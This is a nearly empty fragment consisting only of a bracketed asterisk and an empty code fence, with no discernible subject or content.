[*]

```
